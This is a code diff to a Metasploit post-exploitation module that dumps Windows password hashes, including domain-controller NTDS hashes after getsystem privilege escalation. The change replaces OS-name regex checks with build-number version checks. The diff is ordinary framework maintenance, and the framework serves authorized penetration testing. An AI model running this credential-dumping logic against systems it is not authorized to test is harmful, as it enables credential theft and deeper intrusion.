@@ -417,16 +417,17 @@ class MetasploitModule < Msf::Post
 
     if !is_uac_enabled? || is_admin?
       print_status('Dumping password hashes...')
+      version = get_version_info
       # Check if Running as SYSTEM
       if is_system?
         # For DC's the registry read method does not work.
         if domain_controller
           begin
             file_local_write(pwdfile, inject_hashdump)
-          rescue ::Exception => e
+          rescue ::Exception
             print_error('Failed to dump hashes as SYSTEM, trying to migrate to another process')
 
-            if sysinfo['OS'] =~ /Windows (2008|2012)/i
+            if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
               move_to_sys
               file_local_write(pwdfile, inject_hashdump)
             else
@@ -452,7 +453,7 @@ class MetasploitModule < Msf::Post
             results = session.priv.getsystem
             if results[0]
               print_good('Got SYSTEM privilege')
-              if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
+              if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
                 # Migrate process since on Windows 2008 R2 getsystem
                 # does not set certain privilege tokens required to
                 # inject and dump the hashes.
@@ -466,7 +467,7 @@ class MetasploitModule < Msf::Post
             print_error('Could not get NTDS hashes!')
           end
         end
-      elsif sysinfo['OS'] =~ /Windows (7|8|2008|2012|Vista)/i
+      elsif version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win81)
         if migrate_system
           print_status('Trying to get SYSTEM privilege')
           results = session.priv.getsystem
